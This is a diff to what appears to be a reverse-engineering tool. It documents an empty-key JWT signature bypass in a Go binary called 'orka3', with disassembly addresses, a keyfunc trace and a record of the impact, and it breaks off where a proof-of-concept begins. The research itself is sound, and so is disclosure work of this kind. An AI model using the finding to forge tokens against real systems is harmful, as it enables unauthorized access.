@@ -1488,14 +1488,41 @@ class OrkaJWTRE:
     # 0x1844815: ret nil (success) when equal
     # KEY: crypto/hmac.New accepts empty []byte key — no minimum key length check.
     # HMAC-SHA256(data, b'') is deterministic: forge any token with same empty key.
+    # keyfunc trace (confirmed 2026-08-13 via objdump + cross-ref):
+    # setToken (0x184ae60) → Parse (0x1846e60) → ParseWithClaims (0x18453c0)
+    # keyfunc pointer: go:func.*+0x18e0 @ vaddr 0x2497b08 → setToken.func1 @ 0x184ce80
+    # setToken.func1 disassembly (complete function, 4 instructions):
+    #   0x184ce80: xor %eax, %eax   ; key ptr = nil
+    #   0x184ce82: xor %ebx, %ebx   ; key len = 0
+    #   0x184ce84: mov %rax, %rcx   ; key cap = 0 (Go slice header: ptr/len/cap in RAX/RBX/RCX)
+    #   0x184ce87: mov %rbx, %rdi   ; error = nil (interface: type=nil, data=nil)
+    #   0x184ce8a: ret
+    # → keyfunc ALWAYS returns (nil []byte, nil error) regardless of token content
+    # → crypto/hmac.New(sha256.New, nil) == crypto/hmac.New(sha256.New, []byte{}) == HMAC with empty key
+    # → this is not a misconfiguration: the function was compiled this way deliberately (no-secret mode)
+    KEYFUNC_TRACE = {
+        'setToken_addr':      0x184ae60,
+        'parse_addr':         0x1846e60,
+        'keyfunc_ptr_va':     0x2497b08,   # go:func.*+0x18e0 in .data
+        'keyfunc_fn_addr':    0x184ce80,   # setToken.func1
+        'keyfunc_fn_name':    'setToken.func1',
+        'keyfunc_body':       'xor rax,rax; xor rbx,rbx; mov rcx,rax; mov rdi,rbx; ret',
+        'keyfunc_returns':    '(key=nil, err=nil) — unconditional, no token inspection',
+        'key_effective':      b'',         # nil []byte in Go == empty key for HMAC
+        'impact_chain':       (
+            'setToken.func1 → crypto/hmac.New(sha256, nil) → HMAC-SHA256(signing_input, nil)'
+            ' == HMAC-SHA256(signing_input, b"") → deterministic forged signature'
+        ),
+    }
+
     HMAC_EMPTY_KEY_BYPASS = {
         'function': 'SigningMethodHMAC.Verify',
         'address':  0x1844660,
         'key_type_check': 0x18446a0,
         'hmac_new_call':  0x184476a,
         'compare_call':   0x18447c7,
-        'condition': 'key is []byte (any value including empty) + attacker controls signing string',
-        'root_cause': 'Go crypto/hmac.New has no minimum key length — empty key accepted',
+        'condition': 'keyfunc returns nil key (setToken.func1 @ 0x184ce80) → hmac.New(sha256, nil)',
+        'root_cause': 'setToken.func1 returns nil key unconditionally; Go hmac.New accepts nil == empty key',
         'impact': 'forge any HS256 JWT accepted by orka3 ParseWithClaims',
         'poc': (
             "import jwt\n"
